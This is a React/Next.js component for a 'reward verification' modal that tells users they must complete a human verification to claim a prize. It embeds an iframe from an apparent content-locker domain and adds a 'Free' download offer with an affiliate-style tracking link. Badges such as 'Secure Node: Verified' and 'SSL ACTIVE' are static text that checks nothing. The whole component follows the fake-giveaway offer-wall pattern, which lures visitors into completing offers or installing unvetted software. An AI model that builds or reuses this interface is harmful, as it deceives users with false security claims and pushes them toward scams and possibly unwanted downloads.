'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, Lock, ShieldCheck, Loader2, Info } from 'lucide-react';
import { cn } from '@/lib/utils';
import Image from 'next/image';

/**
 * @fileOverview Professional Verification Portal.
 * Features: Adaptive full-screen mobile view, centered desktop modal, 
 * professional trust-based copy, iframe integration, and a native-style promo section.
 */

interface RewardVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  brand?: string;
  value?: string;
}

export function RewardVerificationModal({ 
  isOpen, 
  onClose,
  brand = "Reward",
  value = "Selected"
}: RewardVerificationModalProps) {
  const [iframeLoaded, setIframeLoaded] = useState(false);

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
      setIframeLoaded(false);
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-[10000] flex items-center justify-center p-0 md:p-4 lg:p-8">
        {/* Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={onClose}
          className="absolute inset-0 bg-black/90 backdrop-blur-md"
        />

        {/* Modal Container */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          className={cn(
            "relative flex flex-col overflow-hidden bg-[#050b18] border-white/10 shadow-[0_0_100px_rgba(0,0,0,0.8)]",
            "w-full h-full md:h-[90vh] md:max-w-[900px] md:rounded-[2rem] md:border"
          )}
        >
          {/* 1. PROFESSIONAL HEADER */}
          <header className="relative z-20 bg-black/60 backdrop-blur-xl border-b border-white/10 p-5 md:p-8 shrink-0">
            <div className="flex items-start justify-between gap-4">
              <div className="flex items-start gap-4">
                <div className="w-10 h-10 md:w-12 md:h-12 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center shrink-0">
                  <Lock className="w-5 h-5 md:w-6 md:h-6 text-primary" />
                </div>
                <div className="space-y-1">
                  <h2 className="text-lg md:text-xl font-black text-white uppercase tracking-tight leading-none">
                    Complete Verification <span className="text-primary">to Claim</span>
                  </h2>
                  <p className="text-[10px] md:text-xs text-white/50 font-medium leading-relaxed max-w-lg">
                    To claim your reward, please complete a quick human verification. This helps us prevent fraud and ensure real users receive rewards.
                  </p>
                </div>
              </div>
              
              <button 
                onClick={onClose}
                className="w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-white/40 hover:text-white transition-all shrink-0 border border-white/5"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
          </header>

          {/* 2. SCROLLABLE VIEWPORT (IFRAME + PROMO) */}
          <div className="flex-1 overflow-y-auto bg-black/20 custom-scrollbar flex flex-col">
            {/* IFRAME SECTION */}
            <div className="relative w-full h-[500px] md:h-[600px] shrink-0">
              {!iframeLoaded && (
                <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 z-0">
                  <Loader2 className="w-10 h-10 text-primary animate-spin" />
                  <span className="text-[10px] font-black text-white/20 uppercase tracking-[0.3em] animate-pulse">
                    Loading Secure Verification...
                  </span>
                </div>
              )}
              
              <iframe
                src="https://gameflashx.space/cl/i/277ood"
                className={cn(
                  "w-full h-full border-none transition-opacity duration-700",
                  iframeLoaded ? "opacity-100" : "opacity-0"
                )}
                onLoad={() => setIframeLoaded(true)}
                title="Reward Verification"
              />
            </div>

            {/* 3. NATIVE OFFER-STYLE PROMO SECTION */}
            <div className="px-5 pb-8 md:px-8 md:pb-10 mt-4">
              <a 
                href="https://playabledownloads.com/show.php?l=0&u=1149831&id=74581" 
                target="_blank" 
                rel="noopener noreferrer"
                className="bg-white rounded-[14px] p-[10px] flex items-center justify-between group/offer transition-all duration-300 hover:-translate-y-1 hover:shadow-[0_10px_20px_rgba(0,0,0,0.2)] cursor-pointer"
              >
                {/* Left: Image + Text Content */}
                <div className="flex items-center gap-3 min-w-0">
                  <div className="relative w-[52px] h-[52px] shrink-0 rounded-[10px] overflow-hidden shadow-[0_0_10px_rgba(0,157,255,0.1)] border border-black/5">
                    <Image 
                      src="https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1775581463/1775581364370_qtkuql.png"
                      alt="Distortion"
                      fill
                      className="object-cover transition-transform duration-500 group-hover/offer:scale-110"
                    />
                  </div>

                  <div className="min-w-0">
                    <h4 className="text-[14px] font-semibold text-black leading-tight truncate">
                      🇺🇸 Start Playing Distortion Now!
                    </h4>
                    <p className="text-[12px] text-[#444] mt-0.5 truncate font-medium">
                      Download and install to begin instantly.
                    </p>
                  </div>
                </div>

                {/* Right: Badges */}
                <div className="flex flex-col items-end gap-1 shrink-0 ml-2">
                  <div className="bg-gradient-to-r from-[#009dff] to-[#00e0ff] text-white text-[9px] font-black px-2.5 py-0.5 rounded-full uppercase tracking-wider shadow-sm">
                    Free
                  </div>
                  <span className="text-[10px] font-bold text-[#009dff] whitespace-nowrap">
                    Featured for you
                  </span>
                </div>
              </a>
            </div>
          </div>

          {/* 4. SECURITY FOOTER */}
          <footer className="bg-black/40 border-t border-white/5 p-4 md:px-8 flex items-center justify-between gap-4 shrink-0">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-primary" />
              <span className="text-[9px] font-black text-white/40 uppercase tracking-[0.2em]">Secure Node: Verified</span>
            </div>
            
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-1.5 text-[9px] font-bold text-white/20 uppercase tracking-widest">
                <Info className="w-3 h-3" />
                Takes 30–60 seconds
              </div>
              <div className="h-4 w-px bg-white/5" />
              <span className="text-[9px] font-black text-primary uppercase tracking-[0.3em]">SSL ACTIVE</span>
            </div>
          </footer>

          {/* Background Ambient Glow */}
          <div className="absolute -top-24 -right-24 w-64 h-64 bg-primary/5 rounded-full blur-[100px] pointer-events-none" />
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
